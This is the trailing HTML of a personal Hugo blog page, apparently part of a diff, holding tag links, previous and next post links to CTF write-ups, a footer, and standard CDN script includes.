+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2025-01-03-bastard/" data-toggle="tooltip" data-placement="top" title="Bastard HTB">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2024-03-30-acscctf2024/" data-toggle="tooltip" data-placement="top" title="ACSCCTF2024 - WEB chall">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
